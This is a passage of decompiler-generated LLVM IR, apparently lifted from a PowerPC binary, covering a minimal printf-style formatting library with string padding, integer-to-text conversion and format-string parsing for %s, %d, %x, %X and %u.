  %v3_1000079c14 = icmp eq i8 %v2_1000079411, 0
  br i1 %v3_1000079c14, label %dec_label_pc_100007cc.preheader, label %dec_label_pc_10000760.lr.ph

dec_label_pc_10000760.lr.ph:                      ; preds = %dec_label_pc_10000790.preheader
  %v2_10000774 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_10000760

dec_label_pc_10000760:                            ; preds = %dec_label_pc_10000760.lr.ph, %dec_label_pc_10000760
  %v4_1000079017 = phi i32 [ %tmp, %dec_label_pc_10000760.lr.ph ], [ %v1_10000788, %dec_label_pc_10000760 ]
  %stack_var_-36.016 = phi i8* [ %arg2, %dec_label_pc_10000760.lr.ph ], [ %v5_1000078c, %dec_label_pc_10000760 ]
  %stack_var_-12.115 = phi i32 [ %stack_var_-12.1.ph, %dec_label_pc_10000760.lr.ph ], [ %v1_1000077c, %dec_label_pc_10000760 ]
  %v2_10000764 = load i8, i8* %stack_var_-36.016, align 1
  %v3_10000764 = zext i8 %v2_10000764 to i32
  %v3_10000774 = call i32 @printchar(i32* %v2_10000774, i32 %v3_10000764)
  %v1_1000077c = add i32 %stack_var_-12.115, 1
  %v1_10000788 = add i32 %v4_1000079017, 1
  %v5_1000078c = inttoptr i32 %v1_10000788 to i8*
  %v2_10000794 = load i8, i8* %v5_1000078c, align 1
  %v3_1000079c = icmp eq i8 %v2_10000794, 0
  br i1 %v3_1000079c, label %dec_label_pc_100007cc.preheader, label %dec_label_pc_10000760

dec_label_pc_100007cc.preheader:                  ; preds = %dec_label_pc_10000760, %dec_label_pc_10000790.preheader
  %stack_var_-12.1.lcssa = phi i32 [ %stack_var_-12.1.ph, %dec_label_pc_10000790.preheader ], [ %v1_1000077c, %dec_label_pc_10000760 ]
  %v2_100007d06 = icmp sgt i32 %stack_var_-32.2.ph, 0
  br i1 %v2_100007d06, label %dec_label_pc_100007a8.lr.ph, label %dec_label_pc_100007d8

dec_label_pc_100007a8.lr.ph:                      ; preds = %dec_label_pc_100007cc.preheader
  %v2_100007b0 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_100007a8

dec_label_pc_100007a8:                            ; preds = %dec_label_pc_100007a8.lr.ph, %dec_label_pc_100007a8
  %stack_var_-32.39 = phi i32 [ %stack_var_-32.2.ph, %dec_label_pc_100007a8.lr.ph ], [ %v1_100007c4, %dec_label_pc_100007a8 ]
  %v3_100007b0 = call i32 @printchar(i32* %v2_100007b0, i32 %stack_var_-16.0)
  %v1_100007c4 = add nsw i32 %stack_var_-32.39, -1
  %v2_100007d0 = icmp sgt i32 %stack_var_-32.39, 1
  br i1 %v2_100007d0, label %dec_label_pc_100007a8, label %dec_label_pc_100007cc.dec_label_pc_100007d8_crit_edge

dec_label_pc_100007cc.dec_label_pc_100007d8_crit_edge: ; preds = %dec_label_pc_100007a8
  %tmp47 = add i32 %stack_var_-12.1.lcssa, %stack_var_-32.2.ph
  br label %dec_label_pc_100007d8

dec_label_pc_100007d8:                            ; preds = %dec_label_pc_100007cc.dec_label_pc_100007d8_crit_edge, %dec_label_pc_100007cc.preheader
  %stack_var_-12.2.lcssa = phi i32 [ %tmp47, %dec_label_pc_100007cc.dec_label_pc_100007d8_crit_edge ], [ %stack_var_-12.1.lcssa, %dec_label_pc_100007cc.preheader ]
  ret i32 %stack_var_-12.2.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-12.1.lcssa, { 1, 0 }
  uselistorder i32 %v1_10000788, { 1, 0 }
  uselistorder i32 %stack_var_-32.0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %stack_var_-20.0.lcssa, { 1, 0 }
  uselistorder i32 %v1_100006b8, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 %arg3, { 2, 0, 1, 3 }
  uselistorder i8* %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100007a8, { 1, 0 }
  uselistorder label %dec_label_pc_10000760, { 1, 0 }
  uselistorder label %dec_label_pc_1000072c, { 1, 0 }
  uselistorder label %dec_label_pc_10000718, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10000700, { 1, 0 }
  uselistorder label %dec_label_pc_100006a8, { 1, 0 }
}

define i32 @printi(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-77 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %v3_10000844 = icmp eq i32 %arg2, 0
  br i1 %v3_10000844, label %dec_label_pc_1000084c, label %dec_label_pc_10000880

dec_label_pc_1000084c:                            ; preds = %entry
  store i32 48, i32* %stack_var_-88, align 4
  %v4_10000870 = bitcast i32* %stack_var_-88 to i8*
  %v5_10000870 = call i32 @prints(i32 %arg1, i8* %v4_10000870, i32 %arg5, i32 %arg6)
  br label %dec_label_pc_100009d8

dec_label_pc_10000880:                            ; preds = %entry
  %v3_10000884 = icmp eq i32 %arg4, 0
  br i1 %v3_10000884, label %dec_label_pc_100008b8, label %dec_label_pc_1000088c

dec_label_pc_1000088c:                            ; preds = %dec_label_pc_10000880
  %v3_10000890 = icmp eq i32 %arg3, 10
  br i1 %v3_10000890, label %dec_label_pc_10000898, label %dec_label_pc_100008b8

dec_label_pc_10000898:                            ; preds = %dec_label_pc_1000088c
  %tmp27 = icmp sgt i32 %arg2, -1
  br i1 %tmp27, label %dec_label_pc_100008b8, label %dec_label_pc_100008a4

dec_label_pc_100008a4:                            ; preds = %dec_label_pc_10000898
  %v1_100008b0 = sub i32 0, %arg2
  br label %dec_label_pc_100008b8

dec_label_pc_100008b8:                            ; preds = %dec_label_pc_1000088c, %dec_label_pc_10000898, %dec_label_pc_10000880, %dec_label_pc_100008a4
  %stack_var_-44.0 = phi i32 [ %arg2, %dec_label_pc_10000880 ], [ %arg2, %dec_label_pc_10000898 ], [ %v1_100008b0, %dec_label_pc_100008a4 ], [ %arg2, %dec_label_pc_1000088c ]
  %stack_var_-36.0 = phi i32 [ 0, %dec_label_pc_10000880 ], [ 0, %dec_label_pc_10000898 ], [ 1, %dec_label_pc_100008a4 ], [ 0, %dec_label_pc_1000088c ]
  %tmp28 = bitcast i32* %stack_var_-77 to i8*
  store i8 0, i8* %tmp28, align 4
  %v3_100009445 = icmp eq i32 %stack_var_-44.0, 0
  br i1 %v3_100009445, label %dec_label_pc_1000094c, label %dec_label_pc_100008d0.lr.ph

dec_label_pc_100008d0.lr.ph:                      ; preds = %dec_label_pc_100008b8
  %v2_10000900 = add i32 %arg7, -58
  br label %dec_label_pc_100008d0

dec_label_pc_100008d0:                            ; preds = %dec_label_pc_100008d0.lr.ph, %dec_label_pc_1000090c
  %stack_var_-44.17 = phi i32 [ %stack_var_-44.0, %dec_label_pc_100008d0.lr.ph ], [ %v2_10000938, %dec_label_pc_1000090c ]
  %stack_var_-28.06 = phi i8* [ %tmp28, %dec_label_pc_100008d0.lr.ph ], [ %v5_10000914, %dec_label_pc_1000090c ]
  %v2_100008d8 = urem i32 %stack_var_-44.17, %arg3
  %tmp29 = icmp slt i32 %v2_100008d8, 10
  br i1 %tmp29, label %dec_label_pc_1000090c, label %dec_label_pc_100008f8

dec_label_pc_100008f8:                            ; preds = %dec_label_pc_100008d0
  %v1_10000904 = add i32 %v2_10000900, %v2_100008d8
  br label %dec_label_pc_1000090c

dec_label_pc_1000090c:                            ; preds = %dec_label_pc_100008d0, %dec_label_pc_100008f8
  %stack_var_-32.0 = phi i32 [ %v2_100008d8, %dec_label_pc_100008d0 ], [ %v1_10000904, %dec_label_pc_100008f8 ]
  %v4_1000090c = ptrtoint i8* %stack_var_-28.06 to i32
  %v1_10000910 = add i32 %v4_1000090c, -1
  %v5_10000914 = inttoptr i32 %v1_10000910 to i8*
  %fold = add i32 %stack_var_-32.0, 48
  %v1_1000092c = trunc i32 %fold to i8
  store i8 %v1_1000092c, i8* %v5_10000914, align 1
  %v2_10000938 = udiv i32 %stack_var_-44.17, %arg3
  %v3_10000944 = icmp ult i32 %stack_var_-44.17, %arg3
  br i1 %v3_10000944, label %dec_label_pc_1000094c, label %dec_label_pc_100008d0

dec_label_pc_1000094c:                            ; preds = %dec_label_pc_1000090c, %dec_label_pc_100008b8
  %stack_var_-28.0.lcssa = phi i8* [ %tmp28, %dec_label_pc_100008b8 ], [ %v5_10000914, %dec_label_pc_1000090c ]
  %v3_10000950 = icmp eq i32 %stack_var_-36.0, 0
  br i1 %v3_10000950, label %dec_label_pc_100009b4, label %dec_label_pc_10000958

dec_label_pc_10000958:                            ; preds = %dec_label_pc_1000094c
  %v3_1000095c = icmp eq i32 %arg5, 0
  br i1 %v3_1000095c, label %dec_label_pc_1000099c, label %dec_label_pc_10000964

dec_label_pc_10000964:                            ; preds = %dec_label_pc_10000958
  %v1_10000968 = call i32 @__asm_rlwinm(i32 %arg6, i32 0, i32 30, i32 30)
  %v3_1000096c = icmp eq i32 %v1_10000968, 0
  br i1 %v3_1000096c, label %dec_label_pc_1000099c, label %dec_label_pc_10000974

dec_label_pc_10000974:                            ; preds = %dec_label_pc_10000964
  %v2_1000097c = inttoptr i32 %arg1 to i32*
  %v3_1000097c = call i32 @printchar(i32* %v2_1000097c, i32 45)
  %v1_10000990 = add i32 %arg5, -1
  br label %dec_label_pc_100009b4

dec_label_pc_1000099c:                            ; preds = %dec_label_pc_10000964, %dec_label_pc_10000958
  %v4_1000099c = ptrtoint i8* %stack_var_-28.0.lcssa to i32
  %v1_100009a0 = add i32 %v4_1000099c, -1
  %v5_100009a4 = inttoptr i32 %v1_100009a0 to i8*
  store i8 45, i8* %v5_100009a4, align 1
  br label %dec_label_pc_100009b4

dec_label_pc_100009b4:                            ; preds = %dec_label_pc_1000094c, %dec_label_pc_10000974, %dec_label_pc_1000099c
  %stack_var_-28.1 = phi i8* [ %stack_var_-28.0.lcssa, %dec_label_pc_1000094c ], [ %v5_100009a4, %dec_label_pc_1000099c ], [ %stack_var_-28.0.lcssa, %dec_label_pc_10000974 ]
  %stack_var_-56.0 = phi i32 [ %arg5, %dec_label_pc_1000094c ], [ %arg5, %dec_label_pc_1000099c ], [ %v1_10000990, %dec_label_pc_10000974 ]
  %stack_var_-40.0 = phi i32 [ 0, %dec_label_pc_1000094c ], [ 0, %dec_label_pc_1000099c ], [ 1, %dec_label_pc_10000974 ]
  %v5_100009c4 = call i32 @prints(i32 %arg1, i8* %stack_var_-28.1, i32 %stack_var_-56.0, i32 %arg6)
  %v2_100009d0 = add i32 %v5_100009c4, %stack_var_-40.0
  br label %dec_label_pc_100009d8

dec_label_pc_100009d8:                            ; preds = %dec_label_pc_1000084c, %dec_label_pc_100009b4
  %storemerge = phi i32 [ %v2_100009d0, %dec_label_pc_100009b4 ], [ %v5_10000870, %dec_label_pc_1000084c ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8* %stack_var_-28.0.lcssa, { 2, 0, 1 }
  uselistorder i8* %v5_10000914, { 0, 2, 1 }
  uselistorder i32 %v2_100008d8, { 1, 0, 2 }
  uselistorder i32 %stack_var_-44.17, { 0, 2, 1 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg5, { 1, 3, 0, 2, 4 }
  uselistorder i32 %arg3, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 0, 2, 4, 1, 3, 5 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100009d8, { 1, 0 }
  uselistorder label %dec_label_pc_100009b4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000090c, { 1, 0 }
  uselistorder label %dec_label_pc_100008d0, { 1, 0 }
  uselistorder label %dec_label_pc_100008b8, { 3, 1, 0, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg3 to i8*
  %tmp41 = ptrtoint i32* %arg1 to i32
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-68.427 = inttoptr i32 %arg2 to i8*
  %v2_10000fc828 = load i8, i8* %stack_var_-68.427, align 1
  %v3_10000fd031 = icmp eq i8 %v2_10000fc828, 0
  br i1 %v3_10000fd031, label %dec_label_pc_10000fd8, label %dec_label_pc_10000a24.lr.ph

dec_label_pc_10000a24.lr.ph:                      ; preds = %entry
  %v1_10000b98 = add i32 %arg3, 4
  %v2_10000b98 = inttoptr i32 %v1_10000b98 to i32*
  %v1_10000b60 = add i32 %arg3, 8
  %v2_10000b60 = inttoptr i32 %v1_10000b60 to i32*
  %v4_10000f7c = bitcast i32* %stack_var_-88 to i8*
  br label %dec_label_pc_10000a24

dec_label_pc_10000a24:                            ; preds = %dec_label_pc_10000a24.lr.ph, %dec_label_pc_10000fb8
  %stack_var_-68.434 = phi i8* [ %stack_var_-68.427, %dec_label_pc_10000a24.lr.ph ], [ %stack_var_-68.4, %dec_label_pc_10000fb8 ]
  %stack_var_-68.4.in33 = phi i32 [ %arg2, %dec_label_pc_10000a24.lr.ph ], [ %v1_10000fbc, %dec_label_pc_10000fb8 ]
  %stack_var_-56.132 = phi i32 [ 0, %dec_label_pc_10000a24.lr.ph ], [ %stack_var_-56.0, %dec_label_pc_10000fb8 ]
  %v2_10000a28 = load i8, i8* %stack_var_-68.434, align 1
  %v3_10000a30 = icmp eq i8 %v2_10000a28, 37
  br i1 %v3_10000a30, label %dec_label_pc_10000a38, label %dec_label_pc_10000f94

dec_label_pc_10000a38:                            ; preds = %dec_label_pc_10000a24
  %v1_10000a3c = add i32 %stack_var_-68.4.in33, 1
  %v5_10000a40 = inttoptr i32 %v1_10000a3c to i8*
  %v2_10000a58 = load i8, i8* %v5_10000a40, align 1
  %v3_10000a60 = icmp eq i8 %v2_10000a58, 0
  br i1 %v3_10000a60, label %dec_label_pc_10000fd8, label %dec_label_pc_10000a68

dec_label_pc_10000a68:                            ; preds = %dec_label_pc_10000a38
  %v2_10000a6c = load i8, i8* %v5_10000a40, align 1
  %v3_10000a74 = icmp eq i8 %v2_10000a6c, 37
  br i1 %v3_10000a74, label %dec_label_pc_10000f94, label %dec_label_pc_10000a7c

dec_label_pc_10000a7c:                            ; preds = %dec_label_pc_10000a68
  %v2_10000a80 = load i8, i8* %v5_10000a40, align 1
  %v3_10000a88 = icmp eq i8 %v2_10000a80, 45
  br i1 %v3_10000a88, label %dec_label_pc_10000a90, label %dec_label_pc_10000ac0.preheader

dec_label_pc_10000a90:                            ; preds = %dec_label_pc_10000a7c
  %v1_10000a94 = add i32 %stack_var_-68.4.in33, 2
  %v5_10000a98 = inttoptr i32 %v1_10000a94 to i8*
  br label %dec_label_pc_10000ac0.preheader

dec_label_pc_10000ac0.preheader:                  ; preds = %dec_label_pc_10000a90, %dec_label_pc_10000a7c
  %stack_var_-68.0.ph = phi i8* [ %v5_10000a40, %dec_label_pc_10000a7c ], [ %v5_10000a98, %dec_label_pc_10000a90 ]
  %stack_var_-52.0.ph = phi i32 [ 0, %dec_label_pc_10000a7c ], [ 1, %dec_label_pc_10000a90 ]
  %v4_10000ac03 = ptrtoint i8* %stack_var_-68.0.ph to i32
  %v2_10000ac44 = load i8, i8* %stack_var_-68.0.ph, align 1
  %v3_10000acc8 = icmp eq i8 %v2_10000ac44, 48
  br i1 %v3_10000acc8, label %dec_label_pc_10000aa8, label %dec_label_pc_10000b0c.preheader

dec_label_pc_10000aa8:                            ; preds = %dec_label_pc_10000ac0.preheader, %dec_label_pc_10000aa8
  %v4_10000ac010 = phi i32 [ %v1_10000aac, %dec_label_pc_10000aa8 ], [ %v4_10000ac03, %dec_label_pc_10000ac0.preheader ]
  %stack_var_-52.09 = phi i32 [ %v1_10000ab8, %dec_label_pc_10000aa8 ], [ %stack_var_-52.0.ph, %dec_label_pc_10000ac0.preheader ]
  %v1_10000aac = add i32 %v4_10000ac010, 1
  %v5_10000ab0 = inttoptr i32 %v1_10000aac to i8*
  %v1_10000ab8 = or i32 %stack_var_-52.09, 2
  %v2_10000ac4 = load i8, i8* %v5_10000ab0, align 1
  %v3_10000acc = icmp eq i8 %v2_10000ac4, 48
  br i1 %v3_10000acc, label %dec_label_pc_10000aa8, label %dec_label_pc_10000b0c.preheader

dec_label_pc_10000b0c.preheader:                  ; preds = %dec_label_pc_10000aa8, %dec_label_pc_10000ac0.preheader
  %stack_var_-52.0.lcssa = phi i32 [ %stack_var_-52.0.ph, %dec_label_pc_10000ac0.preheader ], [ %v1_10000ab8, %dec_label_pc_10000aa8 ]
  %stack_var_-68.0.lcssa = phi i8* [ %stack_var_-68.0.ph, %dec_label_pc_10000ac0.preheader ], [ %v5_10000ab0, %dec_label_pc_10000aa8 ]
  %v4_10000b0c12 = ptrtoint i8* %stack_var_-68.0.lcssa to i32
  %v2_10000b1013 = load i8, i8* %stack_var_-68.0.lcssa, align 1
  %tmp62 = icmp ult i8 %v2_10000b1013, 48
  br i1 %tmp62, label %dec_label_pc_10000b34, label %dec_label_pc_10000b20

dec_label_pc_10000ad8:                            ; preds = %dec_label_pc_10000b20
  %v1_10000adc = mul i32 %stack_var_-48.018, 10
  %v2_10000ae8 = load i8, i8* %stack_var_-68.119, align 1
  %v3_10000ae8 = zext i8 %v2_10000ae8 to i32
  %v2_10000af4 = add i32 %v1_10000adc, -48
  %v1_10000af8 = add i32 %v2_10000af4, %v3_10000ae8
  %v1_10000b04 = add i32 %v4_10000b0c20, 1
  %v5_10000b08 = inttoptr i32 %v1_10000b04 to i8*
  %v2_10000b10 = load i8, i8* %v5_10000b08, align 1
  %tmp63 = icmp ult i8 %v2_10000b10, 48
  br i1 %tmp63, label %dec_label_pc_10000b34, label %dec_label_pc_10000b20

dec_label_pc_10000b20:                            ; preds = %dec_label_pc_10000b0c.preheader, %dec_label_pc_10000ad8
  %v4_10000b0c20 = phi i32 [ %v1_10000b04, %dec_label_pc_10000ad8 ], [ %v4_10000b0c12, %dec_label_pc_10000b0c.preheader ]
  %stack_var_-68.119 = phi i8* [ %v5_10000b08, %dec_label_pc_10000ad8 ], [ %stack_var_-68.0.lcssa, %dec_label_pc_10000b0c.preheader ]
  %stack_var_-48.018 = phi i32 [ %v1_10000af8, %dec_label_pc_10000ad8 ], [ 0, %dec_label_pc_10000b0c.preheader ]
  %v2_10000b24 = load i8, i8* %stack_var_-68.119, align 1
  %tmp64 = icmp ult i8 %v2_10000b24, 58
  br i1 %tmp64, label %dec_label_pc_10000ad8, label %dec_label_pc_10000b34

dec_label_pc_10000b34:                            ; preds = %dec_label_pc_10000ad8, %dec_label_pc_10000b20, %dec_label_pc_10000b0c.preheader
  %stack_var_-48.0.lcssa = phi i32 [ 0, %dec_label_pc_10000b0c.preheader ], [ %v1_10000af8, %dec_label_pc_10000ad8 ], [ %stack_var_-48.018, %dec_label_pc_10000b20 ]
  %stack_var_-68.1.lcssa = phi i8* [ %stack_var_-68.0.lcssa, %dec_label_pc_10000b0c.preheader ], [ %v5_10000b08, %dec_label_pc_10000ad8 ], [ %stack_var_-68.119, %dec_label_pc_10000b20 ]
  %v2_10000b38 = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_10000b40 = icmp eq i8 %v2_10000b38, 115
  br i1 %v3_10000b40, label %dec_label_pc_10000b48, label %dec_label_pc_10000c08

dec_label_pc_10000b48:                            ; preds = %dec_label_pc_10000b34
  %v2_10000b4c = load i8, i8* %tmp, align 1
  %tmp65 = icmp ugt i8 %v2_10000b4c, 7
  br i1 %tmp65, label %dec_label_pc_10000b94, label %dec_label_pc_10000b5c

dec_label_pc_10000b5c:                            ; preds = %dec_label_pc_10000b48
  %v3_10000b60 = load i32, i32* %v2_10000b60, align 4
  %v2_10000b68 = load i8, i8* %tmp, align 1
  %v3_10000b68 = zext i8 %v2_10000b68 to i32
  %v1_10000b74 = mul nuw nsw i32 %v3_10000b68, 4
  %v2_10000b78 = add i32 %v1_10000b74, %v3_10000b60
  %v1_10000b80 = add i8 %v2_10000b68, 1
  store i8 %v1_10000b80, i8* %tmp, align 1
  br label %dec_label_pc_10000bac

dec_label_pc_10000b94:                            ; preds = %dec_label_pc_10000b48
  %v3_10000b98 = load i32, i32* %v2_10000b98, align 4
  %v1_10000ba0 = add i32 %v3_10000b98, 4
  store i32 %v1_10000ba0, i32* %v2_10000b98, align 4
  br label %dec_label_pc_10000bac

dec_label_pc_10000bac:                            ; preds = %dec_label_pc_10000b5c, %dec_label_pc_10000b94
  %stack_var_-20.0 = phi i32 [ %v3_10000b98, %dec_label_pc_10000b94 ], [ %v2_10000b78, %dec_label_pc_10000b5c ]
  %v1_10000bb0 = inttoptr i32 %stack_var_-20.0 to i32*
  %v2_10000bb0 = load i32, i32* %v1_10000bb0, align 4
  %v3_10000bbc = icmp eq i32 %v2_10000bb0, 0
  br i1 %v3_10000bbc, label %dec_label_pc_10000bd0, label %dec_label_pc_10000bc4

dec_label_pc_10000bc4:                            ; preds = %dec_label_pc_10000bac
  %v5_10000bc8 = inttoptr i32 %v2_10000bb0 to i8*
  br label %dec_label_pc_10000bdc

dec_label_pc_10000bd0:                            ; preds = %dec_label_pc_10000bac
  br label %dec_label_pc_10000bdc

dec_label_pc_10000bdc:                            ; preds = %dec_label_pc_10000bc4, %dec_label_pc_10000bd0
  %storemerge = phi i8* [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10015ee0.14, i32 0, i32 0), %dec_label_pc_10000bd0 ], [ %v5_10000bc8, %dec_label_pc_10000bc4 ]
  %v6_10000bf0 = call i32 @prints(i32 %tmp41, i8* %storemerge, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa)
  %v2_10000bfc = add i32 %v6_10000bf0, %stack_var_-56.132
  br label %dec_label_pc_10000fb8

dec_label_pc_10000c08:                            ; preds = %dec_label_pc_10000b34
  %v2_10000c0c = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_10000c14 = icmp eq i8 %v2_10000c0c, 100
  br i1 %v3_10000c14, label %dec_label_pc_10000c1c, label %dec_label_pc_10000cbc

dec_label_pc_10000c1c:                            ; preds = %dec_label_pc_10000c08
  %v2_10000c20 = load i8, i8* %tmp, align 1
  %tmp66 = icmp ugt i8 %v2_10000c20, 7
  br i1 %tmp66, label %dec_label_pc_10000c68, label %dec_label_pc_10000c30

dec_label_pc_10000c30:                            ; preds = %dec_label_pc_10000c1c
  %v3_10000c34 = load i32, i32* %v2_10000b60, align 4
  %v2_10000c3c = load i8, i8* %tmp, align 1
  %v3_10000c3c = zext i8 %v2_10000c3c to i32
  %v1_10000c48 = mul nuw nsw i32 %v3_10000c3c, 4
  %v2_10000c4c = add i32 %v1_10000c48, %v3_10000c34
  %v1_10000c54 = add i8 %v2_10000c3c, 1
  store i8 %v1_10000c54, i8* %tmp, align 1
  br label %dec_label_pc_10000c80

dec_label_pc_10000c68:                            ; preds = %dec_label_pc_10000c1c
  %v3_10000c6c = load i32, i32* %v2_10000b98, align 4
  %v1_10000c74 = add i32 %v3_10000c6c, 4
  store i32 %v1_10000c74, i32* %v2_10000b98, align 4
  br label %dec_label_pc_10000c80

dec_label_pc_10000c80:                            ; preds = %dec_label_pc_10000c30, %dec_label_pc_10000c68
  %stack_var_-28.0 = phi i32 [ %v3_10000c6c, %dec_label_pc_10000c68 ], [ %v2_10000c4c, %dec_label_pc_10000c30 ]
  %v1_10000c84 = inttoptr i32 %stack_var_-28.0 to i32*
  %v2_10000c84 = load i32, i32* %v1_10000c84, align 4
  %v7_10000ca4 = call i32 @printi(i32 %tmp41, i32 %v2_10000c84, i32 10, i32 1, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa, i32 97)
  %v2_10000cb0 = add i32 %v7_10000ca4, %stack_var_-56.132
  br label %dec_label_pc_10000fb8

dec_label_pc_10000cbc:                            ; preds = %dec_label_pc_10000c08
  %v2_10000cc0 = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_10000cc8 = icmp eq i8 %v2_10000cc0, 120
  br i1 %v3_10000cc8, label %dec_label_pc_10000cd0, label %dec_label_pc_10000d70

dec_label_pc_10000cd0:                            ; preds = %dec_label_pc_10000cbc
  %v2_10000cd4 = load i8, i8* %tmp, align 1
  %tmp67 = icmp ugt i8 %v2_10000cd4, 7
  br i1 %tmp67, label %dec_label_pc_10000d1c, label %dec_label_pc_10000ce4

dec_label_pc_10000ce4:                            ; preds = %dec_label_pc_10000cd0
  %v3_10000ce8 = load i32, i32* %v2_10000b60, align 4
  %v2_10000cf0 = load i8, i8* %tmp, align 1
  %v3_10000cf0 = zext i8 %v2_10000cf0 to i32
  %v1_10000cfc = mul nuw nsw i32 %v3_10000cf0, 4
  %v2_10000d00 = add i32 %v1_10000cfc, %v3_10000ce8
  %v1_10000d08 = add i8 %v2_10000cf0, 1
  store i8 %v1_10000d08, i8* %tmp, align 1
  br label %dec_label_pc_10000d34

dec_label_pc_10000d1c:                            ; preds = %dec_label_pc_10000cd0
  %v3_10000d20 = load i32, i32* %v2_10000b98, align 4
  %v1_10000d28 = add i32 %v3_10000d20, 4
  store i32 %v1_10000d28, i32* %v2_10000b98, align 4
  br label %dec_label_pc_10000d34

dec_label_pc_10000d34:                            ; preds = %dec_label_pc_10000ce4, %dec_label_pc_10000d1c
  %stack_var_-32.0 = phi i32 [ %v3_10000d20, %dec_label_pc_10000d1c ], [ %v2_10000d00, %dec_label_pc_10000ce4 ]
  %v1_10000d38 = inttoptr i32 %stack_var_-32.0 to i32*
  %v2_10000d38 = load i32, i32* %v1_10000d38, align 4
  %v7_10000d58 = call i32 @printi(i32 %tmp41, i32 %v2_10000d38, i32 16, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa, i32 97)
  %v2_10000d64 = add i32 %v7_10000d58, %stack_var_-56.132
  br label %dec_label_pc_10000fb8

dec_label_pc_10000d70:                            ; preds = %dec_label_pc_10000cbc
  %v2_10000d74 = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_10000d7c = icmp eq i8 %v2_10000d74, 88
  br i1 %v3_10000d7c, label %dec_label_pc_10000d84, label %dec_label_pc_10000e24

dec_label_pc_10000d84:                            ; preds = %dec_label_pc_10000d70
  %v2_10000d88 = load i8, i8* %tmp, align 1
  %tmp68 = icmp ugt i8 %v2_10000d88, 7
  br i1 %tmp68, label %dec_label_pc_10000dd0, label %dec_label_pc_10000d98

dec_label_pc_10000d98:                            ; preds = %dec_label_pc_10000d84
  %v3_10000d9c = load i32, i32* %v2_10000b60, align 4
  %v2_10000da4 = load i8, i8* %tmp, align 1
  %v3_10000da4 = zext i8 %v2_10000da4 to i32
  %v1_10000db0 = mul nuw nsw i32 %v3_10000da4, 4
  %v2_10000db4 = add i32 %v1_10000db0, %v3_10000d9c
  %v1_10000dbc = add i8 %v2_10000da4, 1
  store i8 %v1_10000dbc, i8* %tmp, align 1
  br label %dec_label_pc_10000de8

dec_label_pc_10000dd0:                            ; preds = %dec_label_pc_10000d84
  %v3_10000dd4 = load i32, i32* %v2_10000b98, align 4
  %v1_10000ddc = add i32 %v3_10000dd4, 4
  store i32 %v1_10000ddc, i32* %v2_10000b98, align 4
  br label %dec_label_pc_10000de8

dec_label_pc_10000de8:                            ; preds = %dec_label_pc_10000d98, %dec_label_pc_10000dd0
  %stack_var_-36.0 = phi i32 [ %v3_10000dd4, %dec_label_pc_10000dd0 ], [ %v2_10000db4, %dec_label_pc_10000d98 ]
  %v1_10000dec = inttoptr i32 %stack_var_-36.0 to i32*
  %v2_10000dec = load i32, i32* %v1_10000dec, align 4
  %v7_10000e0c = call i32 @printi(i32 %tmp41, i32 %v2_10000dec, i32 16, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa, i32 65)
  %v2_10000e18 = add i32 %v7_10000e0c, %stack_var_-56.132
  br label %dec_label_pc_10000fb8

dec_label_pc_10000e24:                            ; preds = %dec_label_pc_10000d70
  %v2_10000e28 = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_10000e30 = icmp eq i8 %v2_10000e28, 117
  br i1 %v3_10000e30, label %dec_label_pc_10000e38, label %dec_label_pc_10000ed8

dec_label_pc_10000e38:                            ; preds = %dec_label_pc_10000e24
  %v2_10000e3c = load i8, i8* %tmp, align 1
  %tmp69 = icmp ugt i8 %v2_10000e3c, 7
  br i1 %tmp69, label %dec_label_pc_10000e84, label %dec_label_pc_10000e4c

dec_label_pc_10000e4c:                            ; preds = %dec_label_pc_10000e38
  %v3_10000e50 = load i32, i32* %v2_10000b60, align 4
  %v2_10000e58 = load i8, i8* %tmp, align 1
  %v3_10000e58 = zext i8 %v2_10000e58 to i32
  %v1_10000e64 = mul nuw nsw i32 %v3_10000e58, 4
  %v2_10000e68 = add i32 %v1_10000e64, %v3_10000e50
  %v1_10000e70 = add i8 %v2_10000e58, 1
  store i8 %v1_10000e70, i8* %tmp, align 1
  br label %dec_label_pc_10000e9c

dec_label_pc_10000e84:                            ; preds = %dec_label_pc_10000e38
  %v3_10000e88 = load i32, i32* %v2_10000b98, align 4
  %v1_10000e90 = add i32 %v3_10000e88, 4
  store i32 %v1_10000e90, i32* %v2_10000b98, align 4
  br label %dec_label_pc_10000e9c

dec_label_pc_10000e9c:                            ; preds = %dec_label_pc_10000e4c, %dec_label_pc_10000e84
  %stack_var_-40.0 = phi i32 [ %v3_10000e88, %dec_label_pc_10000e84 ], [ %v2_10000e68, %dec_label_pc_10000e4c ]
  %v1_10000ea0 = inttoptr i32 %stack_var_-40.0 to i32*
  %v2_10000ea0 = load i32, i32* %v1_10000ea0, align 4
  %v7_10000ec0 = call i32 @printi(i32 %tmp41, i32 %v2_10000ea0, i32 10, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa, i32 97)
